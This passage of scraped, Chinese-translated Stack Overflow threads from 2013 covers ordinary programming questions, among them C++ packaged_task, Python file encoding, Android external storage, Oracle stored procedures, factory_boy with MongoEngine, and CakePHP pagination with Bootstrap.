    std::cout << "test6" << " :: ran from thread " << std::this_thread::get_id() << "\n";
    fflush(stdout);
    return i+100;
}

void test(const char* text)
{
    std::cout << text << " :: ran from thread " << std::this_thread::get_id() << "\n";
    fflush(stdout);
}

class testclass
{
public:
    void print1() { test("test3"); }
    void print2() { test("test4"); }
    void print3(const char* text) { test(text); }

};

int main()
{
    testclass testclass1;
    testclass* testclass2 = new testclass;

    task test1(test, "test1");
    task test2([]() { test("test2"); });
    task test3(&testclass::print1, &testclass1);
    task test4(&testclass::print2, &*testclass2);
    task test5(&testclass::print3, &*testclass2, "test5");
    task test6(&testint, 1);

    test1();
    test2();
    test3();
    test4();
    test5();
    test6();

    Sleep(2000);

    return 0;
} 
```

我在想问题是`typename result_of<callable>::type`。我猜它没有正确评估`callable`函数的返回类型。

我正在`c++ (Built by MinGW-builds project) 4.8.0 20121225 (experimental)`使用`Windows 8 64bit`. 我怀疑这些错误无关紧要，因为我想我只是试图以错误的方式完成这项工作，但无论如何这里是错误的粘贴箱：[错误](http://pastebin.ca/2302883)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T20:37:06.050

`std::packaged_task`不仅将调用函数的结果类型作为模板参数，而且还将传递给要调用函数的参数类型。

您可以按如下方式定义它们：

```
// somewhere
int foo(bool, int);

// somewhere else
std::packaged_task<int(bool, int)> p(foo); 
```

要修复您的代码，您需要添加两个空括号对。我上面解释的也适用于`std::result_of`.

```
std::packaged_task<typename std::result_of<callable()>::type()> m_task; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-11-24T14:15:13.293

它只是对主要主题问题的回应。《如何实施》

简短的实现示例：

```
template <typename Signature> /// <---- 1
class Task;

template <typename Res, typename... ArgTypes>
class Task<Res(ArgTypes...)>  /// <---- 2
{
public:
    template <typename Function>
    explicit Task(Function&& callback)
        : _task{std::forward<Function>(callback)}
    { }

    void execute(ArgTypes... args) noexcept(false)
    {
        //...
        _task(std::forward<ArgTypes>(args)...);
    }

private:
    std::packaged_task<Res(ArgTypes...)> _task;
}; 
```

不知道为什么需要第 1 步和第 2 步，但我做了与 lib 实现相同的操作。也许有人可以扩展此响应。

# python - 如何将 unicode 文件作为扩展 ascii 读取

> ID：14346153
> 
> 赞同：-2
> 
> 时间：2013-01-15T20:20:59.357
> 
> 标签：python, unicode

如果我使用以下内容读取 unicode 文件：

```
f = open(r'file.txt','rU')
raw = f.read() 
```

如何使文件被读取为扩展 ascii，即将 \xc3\xaa 正确转换为 ê 并将所有不可显示的字符转换为默认字符（比如？）。

我还有以下内容：

```
# Create a file called sitecustomize.py in c:\python27\Lib\site-packages.
import sys
sys.setdefaultencoding('iso-8859-1') 
```

我不确定是否需要更改。

出于某种原因，我无法将 ê 粘贴到 python 控制台（Windows 中的 dos）中，我可以这样做：

```
>>> s = u'La Pe\xf1a'
>>> print s
La Peña 
```

有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:37:30.740

在python2中

```
import codecs
f = codecs.open('file.txt','rU',encoding='utf8') 
```

在py3中

```
f = open('file.txt','rU',encoding='utf8') 
```

为了消除混淆，没有“unicode 文件”之类的东西。Unicode 是一种数学抽象，文件是磁盘上的字节。为了将这些字节转换为 unicode 代码点的内部存储器表示，python 需要知道如何解释它们。这种解释称为“编码”，从您的帖子中您似乎使用“utf8”。所以你必须告诉python。

# vhdl - 如何用 VHDL 编写仪表总线？

> ID：14346158
> 
> 赞同：0
> 
> 时间：2013-01-15T20:21:21.390
> 
> 标签：vhdl

在我的学习中，我必须用 VHDL 编写仪表总线（m-bus）协议/功能。我不知道我应该从哪一点开始。我读了一点[http://www.m-bus.com/mbusdoc/default.php](http://www.m-bus.com/mbusdoc/default.php)但里面有很多信息。可能你们中的一些人知道正确的功能列表它应该如何工作，或者可能有人有例子，或者我应该如何做的信息？

谢谢你的时间。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T07:19:49.693

我会说从底部开始。

1：找到必要的收发芯片（根据物理层文档为TSS721芯片），并将其连接到FPGA。您可能可以使用它进行环回，然后尝试从同一个 FPGA 发送和接收数据。与它的接口似乎是通过 UART 完成的，因此您可以自己编写一个，或者使用许多可用的 UART 实现之一（如果您使用的是 Xilinx Spartan 系列或类似产品，请查看[PicoBlaze UART implementation](http://www.xilinx.com/products/intellectual-property/picoblaze.htm)）。

2：一旦物理层工作（作为单个 FPGA 上的环回，或两个 FPGA 之间的环回），继续下一层（数据链路层）并使其工作。我强烈建议您熟悉一个好的模拟器，它可以让您逐层测试，而不必依赖 FPGA 中的目标内测试。

3：继续下一层（应用程序和网络），直到完成。

作为参考，我在硕士论文中构建了类似的东西——一个定制的基于 FPGA 的网络，使用 Toslink 收发器。该项目可以在[这里](http://opencores.org/project,tosnet)找到，代码[在这里](http://opencores.org/websvn,listing?repname=tosnet&path=/tosnet/trunk/gateware/TosNet_rev3_2/#path_tosnet_trunk_gateware_TosNet_rev3_2_)——如果你对完整的论文感兴趣，我可能会在某处挖掘 pdf...

# android - 在 Nexus 7 上的外部存储上保存文件并从 PC 检索

> ID：14346160
> 
> 赞同：6
> 
> 时间：2013-01-15T20:21:24.910
> 
> 标签：android, file-io, save, android-sdcard, nexus-7

对于我的项目，我希望能够将传感器数据保存到文件中，并能够从 PC 访问它以进行进一步分析。这是我到目前为止的代码，它可以成功运行：

```
File root = Environment.getExternalStorageDirectory();
File csvfile = new File(root, "Sensor_Data.csv");
FileWriter writer = new FileWriter(csvfile, true);
writer.append("Time");
writer.append(',');
writer.append("Position");
writer.append('\n');
Number data[] = new Number[4000];
for (int i = 0; i<4000; i+=2){
    posHistory.toArray(data);
        writer.append(String.valueOf(data[i]));
    writer.append(',');
        writer.append(String.valueOf(data[i+1]));
    writer.append('\n');
}
writer.flush();
writer.close(); 
```

问题是 Nexus 7 实际上没有外部存储（我相信它使用某种模拟器以便与大多数在其代码中使用外部存储的应用程序兼容。）

运行此代码后，使用设备上的 Astro 文件管理器，我在四个位置看到“Sensor_Data.csv”文件：/sdcard、/storage/sdcard0、/storage/emulated/0 和 /storage/emulated/legacy。我可以使用文本编辑器或文档查看器从设备内打开它们中的每一个，所有数据都在那里。

问题是当我将 Nexus 7 连接到 PC 时，我只看到“内部存储”，打开时实际上只显示虚拟 SD 卡的内容，而不是实际的内部存储，但 .csv 文件不存在。还有一个附加目录“storage/emulated/legacy”，但其中也没有，也没有“sdcard0”或“0”文件夹。当我记录“Environment.getExternalStorageDirectory().getAbsolutePath()”以查看路径是什么时，我得到 /storage/emulated/0

我尝试将文件保存在内部存储的其他位置但没有成功，但我宁愿将其保存在“外部存储”中，以便该应用程序与大多数使用外部存储的设备兼容。

***更新*** 所以使用 adb pull 文件名后，结果如下：

```
adb pull /storage/emulated/0/Sensor_Data.csv
remote object '/storage/emulated/0/Sensor_Data.csv' does not exist

adb pull /storage/emulated/legacy/Sensor_Data.csv
243 Kb/s <1495 bytes in 0.006s>

adb pull /storage/sdcard0/Sensor_Data.csv
243 Kb/s <1495 bytes in 0.006s>

adb pull /sdcard/Sensor_Data.csv
243 Kb/s <1495 bytes in 0.006s> 
```

因此，唯一不起作用的位置是 /storage/emulated/0/Sensor_Data.csv，即使 Astro 在所有四个中都看到它并且 LogCat 显示它正在保存到 /storage/emulated/0/

也只是尝试保存到

```
root = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS); 
```

再次，我可以在相同的四个位置的 Astro 中看到它，但是当我通过 Windows 资源管理器并导航到下载文件夹时，它不存在。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:06:18.247

您是否尝试过使用带有“adb pull filename”和 Astro 看到的完整路径名的终端？这应该可以工作，如果你自己使用它不会太难。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-22T07:11:52.563

我也经历过这种情况（在我的 Nexus 4 上）。该文件存在于我的手机上（使用 adb shell 找到它），但我笔记本电脑上的文件浏览器找不到该文件。就像@billtian 所说，这似乎是 Nexus 4 和 7 设备上的一个错误。我在旧的 Ericsson Xperia 上试用了我的代码，我可以通过我的笔记本电脑找到该文件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-11-21T06:13:54.183

为什么，最好不要将其发送到您的邮箱。请参见以下示例：

```
Intent intent = new Intent(Intent.ACTION_SEND);
intent.setType("text/plain");
intent.putExtra(Intent.EXTRA_EMAIL, new String[] {"email@example.com"});
intent.putExtra(Intent.EXTRA_SUBJECT, "subject here");
intent.putExtra(Intent.EXTRA_TEXT, "body text");
File root = Environment.getExternalStorageDirectory();
File file = new File(root, xmlFilename);
if (!file.exists() || !file.canRead()) {
    Toast.makeText(this, "Attachment Error", Toast.LENGTH_SHORT).show();
    finish();
    return;
}
Uri uri = Uri.parse("file://" + file.getAbsolutePath());
intent.putExtra(Intent.EXTRA_STREAM, uri);
startActivity(Intent.createChooser(intent, "Send email...")); 
```

# java - 光标'排序'SQLite

> ID：14346165
> 
> 赞同：0
> 
> 时间：2013-01-15T20:21:57.013
> 
> 标签：java, android, sqlite

我将来自数据库查询的数据显示在`ListView`. 我的问题是：我可以从查询中订购我的数据，然后将此订购的数据存储在我的游标对象中吗？还是我必须订购`ListView`？

即我可以在以下查询中按名称排序数据吗？

```
Cursor c = ourDatabase.query(DATABASE_TABLE, columns, KEY_ROWID + "=" + passId, null, null, null, null); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T20:23:56.977

查询中的最后一个参数表示[order by](http://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#query%28java.lang.String,%20java.lang.String%5B%5D,%20java.lang.String,%20java.lang.String%5B%5D,%20java.lang.String,%20java.lang.String,%20java.lang.String%29)

例子：

```
Cursor c = ourDatabase.query(DATABASE_TABLE, columns, KEY_ROWID + "=" + passId, null, null, null, coulmnName+" DESC"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T20:30:59.850

```
public Cursor query (String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy, String limit) 
```

在 API 级别 1 中添加 查询给定的表，返回结果集上的游标。

参数 table 要编译查询的表名。columns 要返回的列的列表。传递 null 将返回所有列，不鼓励这样做以防止从存储中读取不会使用的数据。selection 一个过滤器，声明要返回哪些行，格式化为 SQL WHERE 子句（不包括 WHERE 本身）。传递 null 将返回给定表的所有行。selectionArgs 您可以在选择中包含 ?s，它将被 selectionArgs 中的值替换，以便它们出现在选择中。这些值将绑定为字符串。groupBy 声明如何对行进行分组的过滤器，格式化为 SQL GROUP BY 子句（不包括 GROUP BY 本身）。传递 null 将导致行不被分组。如果正在使用行分组，则使用过滤器声明要包含在游标中的行组，格式化为 SQL HAVING 子句（不包括 HAVING 本身）。传递 null 将导致包含所有行组，并且在不使用行分组时是必需的。orderBy 如何对行进行排序，格式为 SQL ORDER BY 子句（不包括 ORDER BY 本身）。传递 null 将使用默认排序顺序，可能是无序的。limit 限制查询返回的行数，格式为 LIMIT 子句。传递 null 表示没有 格式化为 LIMIT 子句。传递 null 表示没有 格式化为 LIMIT 子句。传递 null 表示没有

# php - 替换每一行以正确输出数据

> ID：14346169
> 
> 赞同：0
> 
> 时间：2013-01-15T20:22:01.007
> 
> 标签：php, str-replace

`"\n\n + "`为了[消除这个问题](https://stackoverflow.com/questions/14345662/uncaught-syntaxerror-unexpected-identifier-with-escaped-quotes-in-string/14345768#14345768)，我想替换每个新行。我只想获取数据库中的最后一个数据，所以我使用 PHP 来获取我保存的博客文章的主题和消息。这工作得很好，但它输出的博客文章内容的数据错误。

为了纠正这个问题，我必须以某种方式替换我博客文章中的每一行新行，`"\n\n + "`而我能想到的是，`str_replace`但它不会将新行更改为我想要的。到目前为止，我是这样做的：

`str_replace("/\r\n/", '"\n\n + "', addslashes($saved_blogpost['data_message']))`

我怎样才能解决这个问题？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:26:16.903

实际上，您想使用`json_encode()`，而不是弄乱字符串。

# objective-c - NSArrayController 不更新第二个窗口的内容

> ID：14346174
> 
> 赞同：0
> 
> 时间：2013-01-15T20:22:18.463
> 
> 标签：objective-c, macos, window

我正在编写一个 OSX 应用程序，其中打开第二个窗口以在按下第一个窗口上的按钮时显示结果。窗口 2 开始正常并显示我想要的。但是，当我在 window-1 中更改输入并再次点击操作按钮时，window-2 不会更新结果。

这是我的问题：

1.  在window-1中输入更改后window-2的内容如何更新
2.  window-2 是如何关闭和释放的（现在再次按下操作按钮时，window-2 在关闭之前显示相同的内容）

这是操作按钮的代码：

```
- (IBAction)pushRun:(id)sender {

    if (!rwc)
    {
        rwc = [[ResultWindowController alloc] init];

        [rwc setValueArray:[toDoItemArrayController arrangedObjects]];
        [rwc setNumberOfCalculations:[NSNumber numberWithInt:[_inputNumberOfCalculations intValue]]];
        [rwc calculateResults]; //starts method in 2nd-window controller for result calculation

    }

    [rwc showWindow:self]; 
} 
```

这可能很容易，但我害怕总是创建另一个 ResultWindowController 实例。

提前致谢。约尔格

这是 ResultWindowController.h：

```
#import <Cocoa/Cocoa.h>

@interface ResultWindowController : NSWindowController{

    NSArray *valueArray;
    NSMutableArray *resultArray;
    NSNumber *numberOfCalculations;
}

@property (nonatomic, retain, readwrite) NSArray *valueArray;
@property (retain) NSNumber *numberOfCalculations;
@property (nonatomic, retain, readwrite) NSMutableArray *resultArray;

-(void)calculateResults;

@end 
```

这里是 ResultWindowController.m

```
#import "ResultWindowController.h"
#import "ResultItem.h" //my result model

@implementation ResultWindowController
@synthesize valueArray, resultArray, numberOfCalculations;

- (id)init
{
    if(![super initWithWindowNibName:@"ResultWindow"])
    return nil;
    return self;
}

-(void)awakeFromNib
{

}

- (void)windowDidLoad
{
    [super windowDidLoad];
}

- (void)calculateResults
{
    //a lot of calculation code ...

    ResultItem *newResult = [[ResultItem alloc]init];

    [newResult setValue:[nameArray objectAtIndex:i] forKey:@"name"];
    [newResult setValue:[NSNumber numberWithDouble:avg] forKey:@"averageValue"];
    [newResult setValue:[NSNumber numberWithDouble:min] forKey:@"minValue"];
    [newResult setValue:[NSNumber numberWithDouble:max] forKey:@"maxValue"];
    [newResult setValue:dimensionRandomArray forKey:@"randomArray"];

    [resultArray addObject:newResult]; 

} 
```

`resultarray`是`arraycontroller`ResultWindowController.xib 中的内容源。`arraycontroller`绑定到应该显示数组内容的表视图。这不是第二次更新。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:22:05.193

我相信您必须简单地执行以下操作：

```
- (IBAction)pushRun:(id)sender {

    if (!rwc)
    {
        rwc = [[ResultWindowController alloc] init];

        [rwc setValueArray:[toDoItemArrayController arrangedObjects]];
        [rwc setNumberOfCalculations:[NSNumber numberWithInt:[_inputNumberOfCalculations intValue]]];
        [rwc calculateResults]; //starts method in 2nd-window controller for result calculation

    }
        [rwc setValueArray:[toDoItemArrayController arrangedObjects]];
        [rwc setNumberOfCalculations:[NSNumber numberWithInt:[_inputNumberOfCalculations intValue]]];
        [rwc calculateResults]; //starts method in 2nd-window controller for result 
    [rwc showWindow:self]; 
} 
```

如果 ResultWindowController 不存在，您只是在更改它的值。无论如何，您都想更改值，而不是启动新实例。所以，只要你不使用 [[alloc]init] 你就很好。

希望有帮助。如果您需要其他任何内容，请发表评论。

## 编辑

要为您的 tableView 创建属性，请执行以下操作：

在.h

```
#import <Cocoa/Cocoa.h>

@interface ResultWindowController : NSWindowController{

    NSArray *valueArray;
    NSMutableArray *resultArray;
    NSNumber *numberOfCalculations;
}

@property (nonatomic, retain, readwrite) NSArray *valueArray;
@property (retain) NSNumber *numberOfCalculations;
@property (nonatomic, retain, readwrite) NSMutableArray *resultArray;
@property (assign) NSTableView *yourTableView;   //Add this code
-(void)calculateResults;

@end 
```

这里是 ResultWindowController.m

```
#import "ResultWindowController.h"
#import "ResultItem.h" //Your result model

@implementation ResultWindowController
@synthesize valueArray, resultArray, numberOfCalculations;
@synthesize yourTableView;  //Add this code 
```

然后你应该可以打电话`[yourTableView reloadData]`

# c# - PLS-00201：必须声明标识符“schema.cursorname”

> ID：14346175
> 
> 赞同：0
> 
> 时间：2013-01-15T20:22:25.837
> 
> 标签：c#, asp.net, oracle, plsql, odp.net

我知道这里还有几个其他问题与完全相同的问题，但我 100% 肯定我没有任何类型的权限问题。该过程在查询编辑器中执行良好，但由于某种原因，我无法从一个非常简单的 ASP.net 页面执行此过程。我应该注意这是我第一次尝试创建 Oracle Proc。

这是我调用proc的代码（只是试图调用它并将结果强制放入标签）

```
 string oradb = "connection string here";

    OracleConnection conn = new OracleConnection(oradb);

    OracleCommand cmd = new OracleCommand();
    cmd.Connection = conn;
    cmd.CommandText = "x.GETCURSORS";
    cmd.CommandType = CommandType.StoredProcedure;

    OracleParameter ACTNUM = new OracleParameter();
    ACTNUM.OracleDbType = OracleDbType.Decimal;
    ACTNUM.Direction = ParameterDirection.Input;
    ACTNUM.Value ="12345";
    cmd.Parameters.Add(ACTNUM);

    OracleParameter REJECTS_C = new OracleParameter();
    REJECTS_C.OracleDbType = OracleDbType.RefCursor;
    REJECTS_C.Direction = ParameterDirection.Output;
    cmd.Parameters.Add(REJECTS_C);

    try
    {
        conn.Open();
        OracleDataReader objReader = cmd.ExecuteReader();
        Label3.Text = objReader.ToString();
    }
    catch (Exception ex)
    {
        Label3.Text = string.Format("Exception: {0}", ex.ToString());

    } 
```

包装规格：

```
PACKAGE "x"."REJECTS_DATA" IS

PROCEDURE "GETCURSORS" (
"ACTNUM" IN NUMBER, 
"REJECTS_C" OUT SYS_REFCURSOR);

 END "REJECTS_DATA"; 
```

包体：

```
PACKAGE BODY "x"."REJECTS_DATA" IS

PROCEDURE "GETCURSORS" (
"ACTNUM" IN NUMBER, 
"REJECTS_C" OUT SYS_REFCURSOR) IS

BEGIN

OPEN REJECTS_C FOR SELECT * FROM x.a
WHERE  x.a.ACCOUNT = ACTNUM;

END "GETCURSORS";

END "REJECTS_DATA"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:28:58.107

假设架构名称是`X`，包名称是`REJECTS_DATA`，过程名称是`GETCURSORS`，至少，命令需要是

```
cmd.CommandText = "x.REJECTS_DATA.GETCURSORS"; 
```

如果您实际上在 PL/SQL 中使用区分大小写的标识符（我强烈建议您避免），您还需要在过程名称中使用区分大小写的标识符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-12T07:30:39.407

我们在代码中遇到了同样的问题，不得不将 SCHEMA_NAME 排除在 C# 中的 proc 调用之外，即 PACKAGE_NAME.PROC_NAME。我们通过使用 SCHEMA_NAME 在数据库中创建同义词来解决此问题

# python - 如何使用 factory_boy 为 MongoEngine EmbeddedDocument 建模？

> ID：14346177
> 
> 赞同：7
> 
> 时间：2013-01-15T20:22:31.853
> 
> 标签：python, django, mongoengine, factory-boy

我正在尝试使用 factory_boy 来帮助为我的测试生成一些 MongoEngine 文档。我在定义`EmbeddedDocumentField`对象时遇到了麻烦。

这是我的 MongoEngine `Document`：

```
class Comment(EmbeddedDocument):
    content = StringField()
    name = StringField(max_length=120)

class Post(Document):
    title = StringField(required=True)
    tags = ListField(StringField(), required=True)
    comments = ListField(EmbeddedDocumentField(Comment)) 
```

这是我部分完成的 factory_boy `Factory`：

```
class CommentFactory(factory.Factory):
    FACTORY_FOR = Comment
    content = "Platinum coins worth a trillion dollars are great"
    name = "John Doe"

class BlogFactory(factory.Factory):
    FACTORY_FOR = Blog
    title = "On Using MongoEngine with factory_boy"
    tags = ['python', 'mongoengine', 'factory-boy', 'django']
    comments = [factory.SubFactory(CommentFactory)] # this doesn't work 
```

任何想法如何指定`comments`字段？问题是工厂男孩试图创建`Comment`EmbeddedDocument。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-08-13T07:01:01.640

我不确定这是否是您想要的，但我刚刚开始研究这个问题，这似乎有效：

```
from mongoengine import EmbeddedDocument, Document, StringField, ListField, EmbeddedDocumentField
import factory

class Comment(EmbeddedDocument):
    content = StringField()
    name = StringField(max_length=120)

class Post(Document):
    title = StringField(required=True)
    tags = ListField(StringField(), required=True)
    comments = ListField(EmbeddedDocumentField(Comment))

class CommentFactory(factory.Factory):
    FACTORY_FOR = Comment
    content = "Platinum coins worth a trillion dollars are great"
    name = "John Doe"

class PostFactory(factory.Factory):
    FACTORY_FOR = Post
    title = "On Using MongoEngine with factory_boy"
    tags = ['python', 'mongoengine', 'factory-boy', 'django']
    comments = factory.LazyAttribute(lambda a: [CommentFactory()])

>>> b = PostFactory()
>>> b.comments[0].content
'Platinum coins worth a trillion dollars are great' 
```

如果我错过了什么，我不会感到惊讶。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-16T03:01:43.830

我现在这样做的方式是防止构建基于 EmbeddedDocuments 的工厂。所以，我设置了一个 EmbeddedDocumentFactory，如下所示：

```
class EmbeddedDocumentFactory(factory.Factory):

    ABSTRACT_FACTORY = True

    @classmethod
    def _prepare(cls, create, **kwargs):                                        
        return super(EmbeddedDocumentFactory, cls)._prepare(False, **kwargs) 
```

然后我继承它为 EmbeddedDocuments 创建工厂：

```
class CommentFactory(EmbeddedDocumentFactory):

    FACTORY_FOR = Comment

    content = "Platinum coins worth a trillion dollars are great"
    name = "John Doe" 
```

这可能不是最好的解决方案，所以我会等待其他人回复，然后再接受这个作为答案。

# spring-mvc - 休眠验证错误

> ID：14346181
> 
> 赞同：0
> 
> 时间：2013-01-15T20:22:36.950
> 
> 标签：spring-mvc, hibernate-validator

Hibernate Validator 有大问题

收到此错误

> java.lang.IllegalStateException：Bean 名称“公司”的 BindingResult 和普通目标对象都不能用作请求属性

这是我的控制器

```
 import java.util.logging.Logger;

 import javax.validation.Valid;

 import org.springframework.stereotype.Controller;
 import org.springframework.ui.ModelMap;
 import org.springframework.validation.BindingResult;
 import org.springframework.web.bind.annotation.ModelAttribute;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestMethod;
 import org.springframework.web.bind.annotation.SessionAttributes;

 import com.muuves.reservosity.model.Business_Register;

 @Controller
 @SessionAttributes( {"company"})
 @RequestMapping("/business")
 public class BusinessController {
private final static Logger LOG = Logger.getLogger(BusinessController.class .getName()); 

@RequestMapping(method = RequestMethod.GET)
public String business(ModelMap model) {
    LOG.info("Entering Business Home");
    model.put("company", new Business_Register());
    return "business";
}
@RequestMapping(value="/register", method = RequestMethod.GET)
public String businessRegister() {
    LOG.info("Register Business Page");
    return "business_register";
}

@RequestMapping(value = "/add", method = RequestMethod.POST)
public String addBusiness(@Valid Business_Register company, BindingResult result, ModelMap model) {
    LOG.info("Registering Business"+result.getErrorCount());
    if (result.hasErrors()){
        System.out.println("I found errors now now");
        return "business_register";
    }
    //companyService.addCompany(company);
    return "business_add";
} 
```

}

这是jsp

```
 <%@taglib uri="http://www.springframework.org/tags/form" prefix="form"%>

 <div class="row main-content-reservosity">
<div class="twelve columns">
    <h3>Register Your Business</h3>
    <p>Please register your business details below</p>
    <form:form method="post" action="add" commandName="company">
        <form:errors path="Company"></form:errors>
        <form:input type="text" placeholder="Company Name" path="Company"/>
        <div class="row">
            <div class="six columns">
                <form:input type="text" placeholder="Address Line 1" path="Address_Line_1"/>
                <form:errors path="Address_Line_1"></form:errors>
            </div>
            <div class="six columns">
                <form:input type="text" placeholder="Address Line 2" path="Address_Line_2"/>
                <form:errors path="Address_Line_2"></form:errors>
            </div>
        </div>
        <div class="row">
            <div class="four columns">
                <form:input type="text" placeholder="Postcode" path="Postcode"/>
                <form:errors path="Postcode"></form:errors>
            </div>
            <div class="four columns">
                <form:input type="text" placeholder="County" path="County"/>
                <form:errors path="County"></form:errors>
            </div>
            <div class="four columns">
                <form:input type="text" placeholder="Country" path="Country"/>
                <form:errors path="Country"></form:errors>
            </div>
        </div>
        <div class="row">
            <div class="six columns">
                <form:input type="text" placeholder="Mobile telephone" path="Mobile_Number"/>
                <form:errors path="Mobile_Number"></form:errors>
            </div>
            <div class="six columns">
                <form:input type="text" placeholder="Home telephone" path="Telephone_Number"/>
                <form:errors path="Telephone_Number"></form:errors>
            </div>
        </div>
        <form:errors path="Username"></form:errors>
        <form:input type="text" placeholder="Username" path="Username"/>
        <form:errors path="Password"></form:errors>
        <form:input type="password" placeholder="Password" path="Password"/>
        <br/>
        <button class="radius button" type="submit">Register</button>
        <button class="radius button" type="reset">Cancel</button>
    </form:form>
</div>
  </div>

   import org.hibernate.validator.constraints.NotBlank;

   public class Business_Register {

@NotBlank(message="Name field is mandatory.")
private String Company;
@NotBlank(message="Name field is mandatory.")
private String Address_Line_1;
@NotBlank(message="Name field is mandatory.")
private String Address_Line_2;
@NotBlank(message="Name field is mandatory.")
private String Postcode;
@NotBlank(message="Name field is mandatory.")
private String County;
@NotBlank(message="Name field is mandatory.")
private String Country;
@NotBlank(message="Name field is mandatory.")
private String Mobile_Number;
@NotBlank(message="Name field is mandatory.")
private String Telephone_Number;
@NotBlank(message="Name field is mandatory.")
private String Username;
@NotBlank(message="Name field is mandatory.")
private String Password;

public String getCompany() {
    return Company;
}
public void setCompany(String company) {
    Company = company;
}
public String getAddress_Line_1() {
    return Address_Line_1;
}
public void setAddress_Line_1(String address_Line_1) {
    Address_Line_1 = address_Line_1;
}
public String getAddress_Line_2() {
    return Address_Line_2;
}
public void setAddress_Line_2(String address_Line_2) {
    Address_Line_2 = address_Line_2;
}
public String getPostcode() {
    return Postcode;
}
public void setPostcode(String postcode) {
    Postcode = postcode;
}
public String getCounty() {
    return County;
}
public void setCounty(String county) {
    County = county;
}
public String getCountry() {
    return Country;
}
public void setCountry(String country) {
    Country = country;
}
public String getMobile_Number() {
    return Mobile_Number;
}
public void setMobile_Number(String mobile_Number) {
    Mobile_Number = mobile_Number;
}
public String getTelephone_Number() {
    return Telephone_Number;
}
public void setTelephone_Number(String telephone_Number) {
    Telephone_Number = telephone_Number;
}
public String getUsername() {
    return Username;
}
public void setUsername(String username) {
    Username = username;
}
public String getPassword() {
    return Password;
}
public void setPassword(String password) {
    Password = password;
}
  } 
```

我已将此导入我的 pom.xml

```
 <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-validator</artifactId>
        <version>4.3.1.Final</version>
    </dependency> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T20:41:13.107

需要添加@ModelAttribute("company") [http://blog.nigelsim.org/2011/09/07/spring-mvc-validation-bindingresult/](http://blog.nigelsim.org/2011/09/07/spring-mvc-validation-bindingresult/)

它有效

你需要这样做似乎很荒谬

# cakephp - 使用 CakePHP 分页助手的引导分页

> ID：14346182
> 
> 赞同：26
> 
> 时间：2013-01-15T20:22:39.250
> 
> 标签：cakephp, twitter-bootstrap, pagination

我正在尝试让 CakePHP 的分页助手与引导程序很好地配合使用。也就是说，我希望我的分页元素看起来像引导程序，但由 CakePHP 生成。

目前我的视图页面上有这个：

```
<?php
echo $this->Paginator->numbers(array(
    'before' => '<div class="pagination"><ul>',
    'separator' => '',
    'currentClass' => 'active',
    'tag' => 'li',
    'after' => '</ul></div>'
));
?> 
```

这会产生以下标记：

```
<div class="pagination">
    <ul>
        <li class="active">1</li>
        <li><a href="/test/posts/page:2">2</a></li>
        <li><a href="/test/posts/page:3">3</a></li>
    </ul>
</div> 
```

问题是，因为活动页面（在本例中为 1）在标签中没有`<a>`元素，所以它没有在页面上正确显示（见这里：http: [//i.imgur.com/OczPh.png](http://i.imgur.com/OczPh.png)）。`<li>`

我似乎在 Cookbook 上找不到任何可以解决此问题的内容。

这甚至可以修复吗？

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2013-04-03T16:47:09.853

我已经使用了引导所需的 cake php html 的通用功能。

要点代码：[https ://gist.github.com/jruzafa/5302941](https://gist.github.com/jruzafa/5302941)

```
<div class="pagination pagination-large">
    <ul class="pagination">
            <?php
                echo $this->Paginator->prev(__('prev'), array('tag' => 'li'), null, array('tag' => 'li','class' => 'disabled','disabledTag' => 'a'));
                echo $this->Paginator->numbers(array('separator' => '','currentTag' => 'a', 'currentClass' => 'active','tag' => 'li','first' => 1));
                echo $this->Paginator->next(__('next'), array('tag' => 'li','currentClass' => 'disabled'), null, array('tag' => 'li','class' => 'disabled','disabledTag' => 'a'));
            ?>
        </ul>
    </div> 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-01-16T02:47:05.640

这实际上[在“Paginator”文档的“创建页码链接”部分中](http://book.cakephp.org/2.0/en/core-libraries/helpers/paginator.html#creating-page-number-links)特别提到：

> `currentTag`用于当前页码的标签，默认为空。这允许您生成例如 Twitter Bootstrap 之类的链接，其中当前页码包含在额外的“a”或“span”标签中。

在您的情况下，您需要使用`'currentTag' => 'a'`. 但是，请记住，此选项是在 CakePHP 2.3 中添加的，因此如果您使用的是比该版本更旧的版本，它将不起作用。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-01-15T21:56:30.850

您真正需要做的就是为当前和禁用的项目添加一个 CSS 类以进行匹配。这是我用于我的项目的一个（它基本上是从引导 CSS 文件中复制和粘贴的）。

```
.pagination .current,
.pagination .disabled {
    float: left;
    padding: 0 14px;

    color: #999;
    cursor: default;
    line-height: 34px;
    text-decoration: none;

    border: 1px solid #DDD;
    border-left-width: 0;
} 
```

这使它具有与`a`标签相同的样式。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-12-20T17:03:19.343

我能得到的最好的：

**PHP：**

```
<div class="paging btn-group page-buttons">
    <?php
    echo $this->Paginator->prev('< ' . __d('users', 'previous'), array('class' => 'btn btn-default prev', 'tag' => 'button'), null, array('class' => 'btn btn-default prev disabled', 'tag' => 'button'));
